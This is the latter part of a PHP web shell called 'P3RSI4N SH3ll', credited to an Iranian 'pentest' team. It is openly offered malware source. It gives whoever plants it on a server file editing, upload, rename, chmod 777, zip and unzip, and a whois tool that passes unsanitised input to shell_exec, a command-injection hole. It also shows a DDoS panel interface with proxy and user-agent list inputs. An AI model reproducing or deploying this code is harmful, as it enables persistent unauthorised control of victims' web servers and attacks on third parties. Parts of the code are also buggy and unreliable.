    </div>
  </div>
</div>
        ";
            
/*             
<h6 class'text-center text-warning'>P3rSi4N - Sh3ll</h6>
<button type='button' class='btn btn-secondary' data-bs-dismiss='modal'>Close</button>
 */
            
            
            ?>



            <?php
            if(isset($_GET['ddoser']) && $_GET['ddoser']=="ddoser"){
            echo "
            <div class='div-zoneh'>
                <div class='container'>
                    <div class='row'>
                    
                    
                        <div class='col-6 col-md-4 col-xl-3'>
                            <div class='div-zone-to'>
                                <p class='text-primary' style='font-size:15px;'><span class='text-warning'>[+]</span> Method <span class='text-white'>==></span></p>
                                <form method='post'>
                                    <select name='' class='input-ddoser'>
                                        <option value=''>--------SELECT--------</option>
                                        <option>>> POST Method</option>
                                        <option>>> GET Method</option>
                                    </select>
                                </form>    
                            </div>
                        </div>


                        <div class='col-6 col-md-4 col-xl-3'>
                        <div class='div-zone-to'>
                            <p class='text-primary' style='font-size:15px;'><span class='text-warning'>[+]</span> Address <span class='text-white'>==></span></p>
                            <form method='post'>
                                <input type='text' name='' placeholder='target.com/login.php' class='input-ddoser'/> 

                            </form>    
                        </div>
                    </div>


                    <div class='col-6 col-md-4 col-xl-3'>
                    <div class='div-zone-to'>
                        <p class='text-primary' style='font-size:15px;'><span class='text-warning'>[+]</span> http / https <span class='text-white'>==></span></p>
                        <form method='post'>
                            <select name='' class='input-ddoser'>
                                <option value=''>--------SELECT--------</option>
                                <option>>> HTTP </option>
                                <option>>> HTTPS </option>
                            </select>
                        </form>    
                    </div>
                </div>



                <div class='col-6 col-md-4 col-xl-3'>
                <div class='div-zone-to'>
                    <p class='text-primary' style='font-size:15px;'><span class='text-warning'>[+]</span> User-agent Address <span class='text-white'>==></span></p>
                    <form method='post'>
                        <input type='text' name='' placeholder='/home/user/agent.txt' class='input-ddoser'/> 

                    </form>    
                </div>
            </div>



            <div class='col-6 col-md-4 col-xl-3'>
            <div class='div-zone-to'>
                <p class='text-primary' style='font-size:15px;'><span class='text-warning'>[+]</span> proxy-list Address <span class='text-white'>==></span></p>
                <form method='post'>
                    <input type='text' name='' placeholder='/home/user/proxy.txt' class='input-ddoser'/> 

                </form>    
            </div>
        </div>



                </br>


        <div class='col-12'>
        <div class='div-zone-to'>
            <div class='alert alert-primary alert-dismissible'>
                <button type='button' class='close' data-dismiss='alert'>&times;</button>
                <strong class='text-danger'>Warning !</strong><span style='font-size:14px;'> To add a 'user-agent' and 'proxy-list' of rows must be equal .</span>
            </div>

        </div>
    </div>







                </div></br>
                <center>
                <input type='submit' class='btn btn-warning' value='Start DDoS'>
                </center></br>
            </div>
        </div>

                 ";   

                }

            

            ?>     
<!-- 
<form>
                <input type='text' class='input-dump' name='' placeholder='Server Name'>
                <input type='text' class='input-dump' name='' placeholder='Total'>
                <input type='text' class='input-dump' name='' placeholder='UDP / TCP'>
                </br><center><input type='submit' value='Connect Now' class='btn btn-warning bt-ddoser' name=''></center>
                </form> -->

            <?php 

            if(isset($_GET['whois']) && $_GET['whois']=="whois"){
                
                echo"
               
                <div class='div-whois'>
            
                    <div class='div-dakhel-whois'>
                    </br>
                    <div class='alert alert-primary alert-dismissible'>
    <button type='button' class='close' data-dismiss='alert'>&times;</button>
    <strong class='text-danger'>Warning !</strong> Make sure the '' Shell exec '' function on the server is turned on .
  </div>

                        <form method='POST' enctype='multipart/form-data' '>
                            <input type='text' class='input-whois' name='whois_post' placeholder='Exaple : google.com'>
                            <input type='submit' name='btn_whois' class='btn btn-warning btn-whois' value='Whois Now'>
                        </form>
                    </div>
                  
            ";
        }

        if(isset($_POST['btn_whois'])){
            $ip_domain = $_POST['whois_post'];
            $getwhois = shell_exec("whois $ip_domain");
            //$res_whois2 = print_r($getwhois);
            echo "
            
            <div class='rs-whois'>
                <pre>
                <p class='text-white text-left mtn-res-whois'>$getwhois</p>
            </div>

            ";
           
        }

        echo "</div>";


        ?>
            

            <?php 
            
            if(isset($_GET['agent']) && $_GET['agent']=="agent"){
                echo "
                
                <div class='div-agent'>
                </br>
                <div class='container'>
                <div class='row'><form method='post'>
                    <div class='d-none d-lg-flex col-lg-3'>

                    </div>

                    <div class='col-6 col-lg-3'>
                        <p class='text-primary text-left'><span class='text-warning'>[+]</span> Address <span class='text-white'>==></span></p>
                        <input type='text' placeholder='/home/master/agents/' class='input-ddoser'>
                    </div>

                    <div class='col-6 col-lg-3'>
                        <p class='text-primary text-left'><span class='text-warning'>[+]</span> Resault : <span class='text-white'>==></span></p>
                        <input type='text' placeholder='reasult :' class='input-ddoser'>
                    </div>

                    <div class='d-none d-lg-flex col-lg-3'>

                    </div>
                </div>
                </br><center><input type='submit' class='btn btn-warning' value='Save User-Agent'></center>
            </div></form>
                </div>
                
                ";
            }
            
            
            ?>

            <?php 

            if(isset($_GET['hash_finder']) && $_GET['hash_finder']=="hash_finder"){

                if(isset($_POST['hash_finder_post'])){
                $hash = $_POST['hash_finder_post'];
		            if(strlen($hash)==32){
		            	$hashresult == "MD5 ";
		            }elseif(strlen($hash)==40){
		            	$hashresult = "SHA-1 / MySQL5 ";
		            }elseif(strlen($hash)==13){
		            	$hashresult = "DES(Unix) ";
		            }elseif(strlen($hash)==16){
		            	$hashresult = "MySQL / DES(Oracle )";
		            }elseif(strlen($hash)==41){
		            	$GetHashChar = substr($hash, 40);
		            if($GetHashChar == "*"){
		            	$hashresult = "MySQL5 "; 
		            }	
		            }elseif(strlen($hash)==64){
		            	$hashresult = "SHA-256 ";
		            }elseif(strlen($hash)==96){
		            	$hashresult = "SHA-384 ";
		            }elseif(strlen($hash)==128){
		            	$hashresult = "SHA-512 ";
		            }elseif(strlen($hash)==34){
		            	if(strstr($hash, '$1$')){
		            		$hashresult = "MD5(Unix) ";
		            	} 	
		            }elseif(strlen($hash)==37){
		            	if(strstr($hash, '$apr1$')){
		            		$hashresult = "MD5(APR) ";
		            	} 	
		            }elseif(strlen($hash)==34){
		            	if(strstr($hash, '$H$')){
		            		$hashresult = "MD5(phpBB3) ";
		            	} 	
		            }elseif(strlen($hash)==34){
		            	if(strstr($hash, '$P$')){
		            		$hashresult = "MD5(Wordpress) ";
		            	} 	
		            }elseif(strlen($hash)==39){
		            	if(strstr($hash, '$5$')){
		            		$hashresult = "SHA-256(Unix) ";
		            	} 	
		            }elseif(strlen($hash)==39){
		            	if(strstr($hash, '$6$')){
		            		$hashresult = "SHA-512(Unix) ";
		            	} 	
		            }elseif(strlen($hash)==24){
		            	if(strstr($hash, '==')){
		            		$hashresult = "MD5(Base-64) ";
		            	} 	
		            }
                    else{
		            	$hashresult = "<span class='text-danger'>Hash type not found</span>";
                    }
                }
    


                echo "
                <div class='div-whois'>
                    <div class='div-dakhel-whois'>
                        <form method='POST' enctype='multipart/form-data' '>
                            <input type='text' class='input-whois' name='hash_finder_post' placeholder='Enter your hash ...'>
                            <input type='submit' class='btn btn-warning btn-whois' value='Find'>
                        </form>
                    </div>
                    <div class='result-find-hash'>
                        <h5 class='text-bold text-dark h6 mtn-resilt-hash text-left'>Result : $hashresult </h5>
                    </div>
                </div>
            ";
    
            
        }
            ?>
            
            <?php 
                if(isset($_GET['about']) && $_GET['about']=="about"){

                    echo"
                        <div class='div-about'>
                        <div class='div-dakhel-about'>
                            <img src='b2.jpg' class='img-about1'>
                            <img src='9.jpg' class='img-about2'>
                            <img src='i.jpg' class='img-about3'>
                        </div>

                        <div class=\"div-about-bot\">
                        <h2 class=\" text-monospace text-center mtn-name\">..:: P3RSI4N SH3ll ::..</h2>
                        </div>
                        <h6 class='h6 text-bold text-capitalize text-about-2 text-center text-justify'>Coded by M4ST3R D4RK ~ It4min ~ Amir ~ Mr Nexer ~ Arash </br> Persian PenTest Security Team Iran </h6>
                        
                        <div class='div-icon-about'>
                        <img src='4.jpeg' class='img-about-ic'>
                        <img src='git.png' class='img-about-ic2'>
                        </div>
                        </div>
                    
                    ";
                }


                ?>

                <?php

                
                if(isset($_GET['edit'])){
                        $masir3=$_GET['edit_pwd'];
                        $masir4=$_GET['edit'];
                        $masir_edit=$masir3.$masir4;
                        $sorce_file=htmlspecialchars(file_get_contents($masir_edit));
                    
                        echo "
                        
                            <div class='div-edit'>
                        
                                <div class='div-dakhel-edit'>
                                <span class='text-white'> Rename :</span>
                                <form method='post'>
                                <input class='input-rename' value='$masir4' type='text' name='text_rename' placeholder='Enter your new name . . . '><input type='submit' class='btn btn-warning' name='btn_rename' value='Rename'>
                                <form>
                                    <form method='post'>
                                    
                                        <textarea name='sorce_file_edit' rows='17' class='textarea-1 bg-dark' cols='50'>$sorce_file </textarea>
                                        <center><input type='submit' class='btn btn-warning' name='btn_edit_sorce' value='Save File'></center>
                                    </form>
                                </div>
                            </div>
                        ";
                        if(isset($_POST['btn_rename'])){

                            $new_name=$_POST['text_rename'];
                            $masir_rename=$masir3.$new_name;
                            rename($masir_edit,$masir_rename);
                            if(rename($masir_edit,$masir_rename)){
                                echo "<div class='alert alert-primary'>Renamed !</div>";
                            }

                        }

                        if(isset($_POST['btn_edit_sorce'])){
                            $sorce_edit_file=$_POST['sorce_file_edit'];
                            $file_edit=fopen($masir_edit,"w");
                            fwrite($file_edit,$sorce_edit_file);
                            if(fwrite($file_edit,$sorce_edit_file)){
                                echo "<script>alert('File Edited :)')</script>";
                            }
                            else{
                                echo "<script>alert('Error !')</script>";

                            }
                            fclose($file_edit);
                        }
                   
                    }
                    
                

                ?>

                <?php 

                if(isset($_POST['options']) && $_POST['options']=="Delete"){
                    $hidden_delet=$_POST['hidden_delet'];
                    $masir_delet=dirname(__FILE__)."/".$hidden_delet;
                    echo $masir_delet;
                    /* exit; */

                }



                ?>

                
                

         <!-- **************** End Show Files ******************* -->

        <!-- ****************** Tabe *********************-->
       

        <!-- *********************************************** -->
        </div>



        <div class="box-persian">
            <h2 class="text-center mtn-persian">..:: P3RSI4N - P3NT3ST ::..</h1>
        </div>
    
        
    
        <div class="footer-shell">
            <div class="dakhel-footer">
                <form class="form-foot" method="" action="" enctype="multipart/form-data">
                    <input type="text" class="input-footer text-capitalize" name="name_mkdir" placeholder="making directory">
                    <input type="submit" class="text-capitalize btn-foot" name="btn_mkdir" value="[ Mkdir ]">
                </form>
                <?php 
                if(isset($_POST['btn_mkdir'])){
                    $name_mkdir=$_POST['name_mkdir'];
                    mkdir($name_mkdir);
                    header('location:'.$_SERVER['PHP_SELF']);


                }
                
                ?>
                    <?php $ki_mas=$_GET['pwd']; ?>
                <form class="form-foot" method="GET" action="" enctype="multipart/form-data">
                    <input type="text" class="input-footer" name="pwd" value='<?php echo $ki_mas; ?>' placeholder="Change Dir">
                    <input type='submit' class="text-capitalize btn-foot" name="" value="[ Change ]">
    
                </form>
    
                <form class="form-foot" method="POST" enctype="multipart/form-data">
                    <input type="text" class="input-footer " name="chmodname" placeholder="add Chmod">
                    <input type="submit" class="text-capitalize btn-foot" name="chmodbtn" value="[ Chmod ]">
    
                </form>
                <?php
                function chmod_file($filename){
                    if(isset($_POST['chmodbtn'])){
                        $pwd = dirname(__FILE__)."/".$filename;
                        chmod($pwd, 777);
                    }
                }
                @chmod_file($_POST['chmodname']);
                ?>
    
                <form class="form-foot" method="POST" enctype="multipart/form-data">
                    <input type="text" class="input-footer text-capitalize" name="name_extr" placeholder="Enter your Zip name">
                    <input type="submit" class="text-capitalize btn-foot " name="btn_zip" value="[ Unzip ]">
    
                </form>

                <?php 

                if(isset($_POST['btn_zip'])){
                    $name_extr=$_POST['name_extr'];
                     $name_extr_explod=explode(".",$name_extr);
                    $name_extr_end=end($name_extr_explod); 
             

                    if($name_extr_end=="zip" || $name_extr_end=="ZIP" || $name_extr_end=="Zip"){
                        $ex_z= new ZipArchive();
                        $res_x= $ex_z->open($name_extr);
                        if($res_x=== TRUE){
                            $ex_z->extractTo($nowpath);
                            $ex_z->close();
                            header('location:'.$_SERVER['PHP_SELF']);

                        }
                    }



                }


              

                ?>
    
           <!--      <form class="form-foot" method="" action="" enctype="multipart/form-data">
                    <input type="text" class="input-footer text-capitalize" name="" placeholder="Enter your Directory ">
                    <input type="submit" class="text-capitalize btn-foot" name="" value="[ Move ]">
    
                </form> -->


                <form class="form-foot" method="POST" enctype="multipart/form-data">
                    <input type="text" class="input-footer " name="chmodname" placeholder="Remote Upload">
                    <input type="submit" class="text-capitalize btn-foot" name="chmodbtn" value="[ Upload ]">
    
                </form>

                <form class="form-foot" method="POST" enctype="multipart/form-data">
                    <input type="text" class="input-footer " name="name_zip" placeholder="Examp: t.php/s.html/z.jpg">
                    <input type="submit" class="text-capitalize btn-foot" name="btn_zip" value="[ Zip ]">
    
                </form>

                <?php
                if(isset($_POST['btn_zip'])){
                    $name_zip=$_POST['name_zip'];
                    $name_zip2=explode("/",$name_zip);

                    $zip_file = new ZipArchive();
                    $zip_file->open("$check_sum.zip", ZipArchive::CREATE);
                    
                    foreach($name_zip2 as $name_zip2){

                        $zip_file->addFile($name_zip2);

                    }
                    $zip_file->close();
                }
                
                ?>

    
    <!--             <form class="form-foot" method="" action="" enctype="multipart/form-data">
                    <input type="text" class="input-footer text-capitalize" name="" placeholder="Enter your Directory">
                    <input type="submit" class="text-capitalize btn-foot" name="" value="[ Copy ]">
    
                </form>
                 -->
                <div class="div-uploader">
                    <?php
                    if(isset($_POST['btn_uploader'])){
                        $__name_file__=$_FILES['upload_file']['name'];
                        /* $__ex_file=explode(".",$__name_file__);
                        $__end=end($__ex_file); */
                        $adress_file=$_FILES['upload_file']['tmp_name'];
                        $new_addr=$pwd.$__name_file__;
                        move_uploaded_file($adress_file,$new_addr);
                        if(move_uploaded_file($adress_file,$new_addr)){
                            echo "<script>alert('Uploaded !')</script>";
                        }   
                    }
                    
                    ?>
                <form class="form-foot" method="POST" enctype="multipart/form-data">
                    <input type="file" class="input-file text-capitalize" name="upload_file" placeholder="Enter your Directory">
                    <input type="submit" class="text-capitalize btn-foot" name="btn_uploader" value="[ Upload ]">
    
                </form>
                </div>
    

        <div class="div-bootom">
        <h2 class=" text-monospace text-center mtn-name">..:: P3RSI4N SH3ll ::..</h2>
        </div>
        <h2 class="h6 text-center text-danger mtn-zir">&copy; P3RSI4N P3NT3ST Security Team IRAN | <span><img src="8.jpg" alt="T.me/Persian_Pentest" class="img-tel"></span> </h2>

            </div>
            </div>
</div>
<!-- <button id="btnmolaii">click</button>
 -->
 <script>
 $(document).ready(function () {
        $("#1").click(function(){
            $(".back").css("background-image","url(8.jpg)");
        }),
        $("#2").click(function () {
            $(".back").css("background-image","url(9.jpg)");
        });
        $("#3").click(function () {
            $(".back").css("background-image","url(10.jpg)");
        });
        $("#4").click(function () {
            $(".back").css("background-image","url(11.jpg)");
        });

        $("#5").click(function () {
            $(".box-roo").css("background-color","#000000cb");
        });

        $("#6").click(function () {
            $(".box-roo").css("background-color","#747474a1");
        });

        $("#7").click(function () {
            $(".box-roo").css("background-color","#28333dee");
        });

        $("#8").click(function () {
            $(".box-roo").css("background-color","#1d1d1dc9");
        });




    });






           
</script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</body>
</html>
